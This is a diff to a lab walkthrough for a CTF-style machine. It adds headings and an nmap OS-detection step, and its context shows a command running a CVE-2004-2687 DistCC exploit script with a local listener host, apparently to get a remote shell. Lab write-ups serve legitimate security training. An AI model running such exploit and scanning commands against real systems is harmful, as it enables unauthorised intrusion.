@@ -146,8 +146,9 @@ Nmap done: 1 IP address (1 host up) scanned in 53.82 seconds
 
 ---
 
-# Exploit
+# Exploit - Method I
 
+## Initial Foothold
 ## DistCC Daemon Command Execution
   - Exploit 
 
@@ -155,3 +156,10 @@ Nmap done: 1 IP address (1 host up) scanned in 53.82 seconds
 ▶ python CVE-2004-2687-Exploit.py --rhost 10.10.10.3 --lhost 10.10.14.24
 ```
 ![image](https://user-images.githubusercontent.com/83878909/236668409-86d65ad4-c6b0-44ef-b69c-42948fb7a440.png)
+
+## Privilege Escalation
+  - Check OS version using NMAP.
+```CSS
+▶ nmap -O --osscan-guess 10.10.10.3
+```
+![image](https://user-images.githubusercontent.com/83878909/236670200-3ff0d70b-edaf-4f1e-844d-4737b2a7a33e.png)
